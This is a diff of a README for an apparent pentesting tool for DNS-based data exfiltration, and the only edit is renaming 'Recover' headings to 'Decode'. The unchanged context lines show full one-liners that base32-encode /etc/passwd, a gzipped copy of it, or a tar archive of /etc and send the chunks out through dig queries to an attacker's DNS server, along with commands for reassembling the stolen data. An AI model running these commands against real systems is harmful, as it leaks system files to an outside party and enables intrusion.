@@ -43,7 +43,7 @@ In the examples below: `<DNS Name>` is the random name provided by Burp Collabor
 base32 -w 63 < /etc/passwd | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
-Recover the file:
+Decode the file:
 
 ```
 ./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
@@ -55,7 +55,7 @@ Recover the file:
 gzip - < /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
-Recover/unzip the file:
+Decode/unzip the file:
 
 ```
 ./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d | zcat
@@ -69,7 +69,7 @@ Note that exfiltrating /etc on an Ubuntu Linux system worked perfectly (but took
 tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
-Recover the tar archive:
+Decode the tar archive:
 
 ```
 ./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d > exfiltrated.tgz
